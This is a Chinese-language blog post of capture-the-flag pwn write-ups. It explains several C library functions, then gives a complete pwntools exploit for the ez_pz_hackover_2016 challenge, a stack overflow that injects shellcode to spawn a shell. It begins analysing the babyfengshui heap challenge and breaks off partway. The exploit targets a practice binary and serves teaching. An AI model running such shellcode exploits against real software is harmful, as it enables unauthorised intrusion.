<!doctype html>



  


<html class="theme-next muse use-motion">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="PWN,">





  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">






<meta name="description" content="小题。。。">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="疯狂的木头07">
<meta property="og:url" content="http://yoursite.com/2020/04/30/今天你pwn了吗(三)/index.html">
<meta property="og:site_name" content="mutou-jun&#39;s blog">
<meta property="og:description" content="小题。。。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Z7ND.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Z4nx.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Z5B6.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Zfj1.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZIHK.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZTAO.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Zq9H.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZOgA.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZXjI.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZxDP.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9Zvut.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9ZzHf.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9epE8.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9e9US.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9eC4g.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9eF3j.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/J9eiCQ.png">
<meta property="og:updated_time" content="2020-04-30T18:41:14.307Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="疯狂的木头07">
<meta name="twitter:description" content="小题。。。">
<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/15/J9Z7ND.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Muse',
    sidebar: {"position":"right","display":"always"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> 疯狂的木头07 | mutou-jun's blog </title>
</head>



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>


<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-right page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">mutou-jun's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                疯狂的木头07
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2020-04-30T23:57:04+08:00" content="2020-04-30">
              2020-04-30
            </time>
          </span>

          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>小题。。。</p>
<a id="more"></a>
<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>同样的，在开始之前我们先来看下几个 函数吧，一定要 好好学下遇到的函数呢，很重要的：</p>
<p>fgets</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">char</span> * fgets ( <span class="keyword">char</span> * <span class="keyword">str</span>, <span class="keyword">int</span> num, FILE * stream );</span><br><span class="line">函数功能：</span><br><span class="line">从流中读取字符，并将它们作为C字符串存储到<span class="keyword">str</span>中，直到已读取（num<span class="number">-1</span>）个字符或到达换行符或到达文件末尾（以先发生的为准）。</span><br><span class="line">换行符使fgets停止读取，但是该函数将其视为有效字符并包含在复制到<span class="keyword">str</span>的字符串中。</span><br><span class="line">复制到<span class="keyword">str</span>的字符后会自动附加一个终止的空字符。</span><br><span class="line">请注意，fgets与gets完全不同：fgets不仅接受流参数，而且还允许指定<span class="keyword">str</span>的最大大小，并在字符串中包括任何结尾的换行符。</span><br></pre></td></tr></table></figure>

<p>memchr</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">const</span> <span class="keyword">void</span> * <span class="built_in">memchr</span>（<span class="keyword">const</span> <span class="keyword">void</span> * ptr，<span class="keyword">int</span> value，<span class="keyword">size_t</span> num）;</span><br><span class="line">       <span class="keyword">void</span> * <span class="built_in">memchr</span>（<span class="keyword">void</span> * ptr，<span class="keyword">int</span> value，<span class="keyword">size_t</span> num）;</span><br><span class="line">函数功能：在内存块中找到字符</span><br><span class="line">        在ptr指向的内存块的前num个字节内搜索值的首次出现（解释为无符号字符），并返回指向它的指针。</span><br><span class="line">        在比较时，在ptr数组上检查的值和每个字节都被解释为无符号字符。</span><br></pre></td></tr></table></figure>

<p>strcmp</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="function"><span class="keyword">int</span> <span class="title">strcmp</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * str1, <span class="keyword">const</span> <span class="keyword">char</span> * str2 )</span></span>;</span><br><span class="line">函数功能：比较两个字符串比较C字符串str1和C字符串str2。这个函数开始比较每个字符串的第一个字符。</span><br><span class="line">        如果它们彼此相等，则继续执行下列对操作，直到字符不同或到达终止空字符为止。</span><br><span class="line">        这个函数执行字符的二进制比较。</span><br><span class="line">        有关考虑特定于语言环境的规则的函数，请参阅strcoll。</span><br><span class="line">返回值：</span><br><span class="line">        返回一个整数值，指示字符串之间的关系：</span><br><span class="line">        返回值指示</span><br><span class="line">        &lt;<span class="number">0</span>,   第一个不匹配的字符在ptr1中的值比在ptr2中的值低</span><br><span class="line">        =<span class="number">0</span>,  两个字符串的内容相等</span><br><span class="line">        &gt;<span class="number">0</span>,  第一个不匹配的字符在ptr1中的值大于在ptr2中的值</span><br></pre></td></tr></table></figure>

<p>memcpy():</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">void</span> * memcpy ( <span class="keyword">void</span> * destination, <span class="keyword">const</span> <span class="keyword">void</span> * source, size_t <span class="built_in">num</span> );</span><br><span class="line">函数功能：复制内存块 内存复制块将<span class="built_in">num</span>字节的值从源指向的位置直接复制到目标指向的内存块。</span><br><span class="line"></span><br><span class="line">        源指针和目标指针指向的对象的底层类型与此函数无关;结果是数据的二进制副本。</span><br><span class="line">        该函数不检查源中的任何终止<span class="keyword">null</span>字符—它总是精确地复制<span class="built_in">num</span>字节。</span><br><span class="line">        为了避免溢出，目标和源参数都指向的数组的大小至少应该是<span class="built_in">num</span>字节，并且不应该重叠(对于重叠的内存)</span><br><span class="line">        </span><br><span class="line">特别注意：拷贝的字节数 只以 <span class="built_in">num</span> 控制。</span><br></pre></td></tr></table></figure>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>环境：Ubuntu 16.04</p>
<p>首先查看下文件属性：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">ez_pz_hackover_2016</span></span><br><span class="line"><span class="attr">ez_pz_hackover_2016:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> </span><br><span class="line"><span class="string">BuildID[sha1]=341701ef5091cd200a5fc401bc3a826e3d131086,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">ez_pz_hackover_2016</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Full</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">disabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line">    <span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure>

<p>可以看到  是 32位的elf 程序，且 没有开启任何 保护，<br>于是 首先考虑shellcode 的方式去pwn 掉程序。<br>看下ida：（留意下 代码中的 注释）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">**********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">header</span><span class="params">()</span>                 <span class="comment">//header 其实没有什么的。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"             ___ ____\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"      ___ __| _ \\_  /\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"     / -_)_ /  _// / \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"     \\___/__|_| /___|\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"        lemon squeezy\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">chall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-40Ch]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Yippie, lets crash: %p\n"</span>, &amp;s);   <span class="comment">//这里可以得到栈地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Whats your name?\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x3FF</span>, <span class="built_in">stdin</span>);                 <span class="comment">//向s 处 最多可输入0x3ff字节数据</span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(&amp;s, <span class="string">'\n'</span>, v0);             <span class="comment">//判断程序时候有 "\n"</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;                               <span class="comment">//有的话 令它 等于 "\0"</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nWelcome %s!\n"</span>, &amp;s);         </span><br><span class="line">  result = (<span class="keyword">void</span> *)<span class="built_in">strcmp</span>(&amp;s, <span class="string">"crashme"</span>);  <span class="comment">//这里再将 s处的字符串与"crashme"作比较</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = vuln((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s, <span class="number">0x400</span>u);<span class="comment">//如果相等，进入vuln()函数</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">******************************************************************</span><br><span class="line"><span class="keyword">void</span> *__<span class="function">cdecl <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> src, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+6h] [ebp-32h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;src, n);   <span class="comment">//将 以s位置开始0x400的数据都将会拷贝到dest位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以经过我们的上面的分析(代码中的注释)，写出以下exp：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"></span><br><span class="line">p = process('./ez_pz_hackover_2016')</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 29638)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="section">p.recvuntil('crash: ')</span></span><br><span class="line">stack_addr = int(p.recv(10), 16)     </span><br><span class="line">p.recvuntil('&gt; ')</span><br><span class="line">pd = 'crashme\x00'               <span class="comment">#绕过 strcmp  进入 memcpy</span></span><br><span class="line">pd = pd.ljust(26, '\x00')        <span class="comment">#覆盖 掉 ebp</span></span><br><span class="line">pd += p32(stack_addr-0x1C)<span class="comment">#(0xffdab72c-0xffdab710) 将返回地址 覆盖为 shellcraft所在的栈地址 </span></span><br><span class="line">pd += asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以成功拿到shell！</p>
<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>这题 是个很好的 堆入门题。我们一起来分析下吧。</p>
<p>首先，我们 来检查下保护：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">babyfengshui_33c3_2016</span> </span><br><span class="line"><span class="attr">babyfengshui_33c3_2016:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6,</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">babyfengshui_33c3_2016</span> </span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span>          <span class="string">//</span> <span class="string">这里不是</span> <span class="string">FULL</span> <span class="string">RELRO</span>  <span class="string">，所以考虑</span> <span class="string">通过</span> <span class="string">改某函数的</span> <span class="string">got_addr</span> <span class="string">为</span> <span class="string">system，进而</span> <span class="string">拿到shell</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure>

<p>首先看下 main函数：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  char v0; <span class="regexp">//</span> [esp+<span class="number">3</span>h] [ebp-<span class="number">15</span>h]</span><br><span class="line">  int v1; <span class="regexp">//</span> [esp+<span class="number">4</span>h] [ebp-<span class="number">14</span>h]</span><br><span class="line">  size_t v2; <span class="regexp">//</span> [esp+<span class="number">8</span>h] [ebp-<span class="number">10</span>h]</span><br><span class="line">  unsigned int v3; <span class="regexp">//</span> [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0</span>x14u);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0</span>x14u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"0: Add a user"</span>);</span><br><span class="line">    puts(<span class="string">"1: Delete a user"</span>);</span><br><span class="line">    puts(<span class="string">"2: Display a user"</span>);</span><br><span class="line">    puts(<span class="string">"3: Update a user description"</span>);</span><br><span class="line">    puts(<span class="string">"4: Exit"</span>);</span><br><span class="line">    printf(<span class="string">"Action: "</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1) == -<span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"size of description: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u%c"</span>, &amp;v2, &amp;v0);</span><br><span class="line">      add_8048816(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )                              <span class="regexp">//</span> <span class="keyword">delete</span></span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      delete_8048905(v2);                       <span class="regexp">//</span> 没有 UAF</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )                              <span class="regexp">//</span> show</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      show_804898F(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )                              <span class="regexp">//</span> update</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      update_8048724(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"Bye"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned __int8)i_804B069 &gt; <span class="number">0</span>x31u )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"maximum capacity exceeded, bye"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 我们看 各个函数，因为 有前两篇文章的 感觉，关于ida 上的 伪代码我尽量还是用 图片吧，看的会更清晰些。<br>在这之前 我们首先根据程序运行 封装下函数 我将封装的函数 先放上来，有助于理解：<br>。</p>
<figure class="highlight flix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(size,name,length,text):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"0"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size of description: "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"name: "</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"text length: "</span>,str(length))</span><br><span class="line">	p.sendlineafter(<span class="string">"text: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span></span>(<span class="keyword">index</span>, length, desc):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"text length: "</span>,str(length))</span><br><span class="line">	p.sendlineafter(<span class="string">"text: "</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span></span>(<span class="keyword">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span></span>(<span class="keyword">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br></pre></td></tr></table></figure>

<p>add_8048816函数：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z7ND.png" alt="J9Z7ND.png"><br><br>在add函数中  我们 可以 知道这个程序 用的结构体 应该是 这个样子：</p>
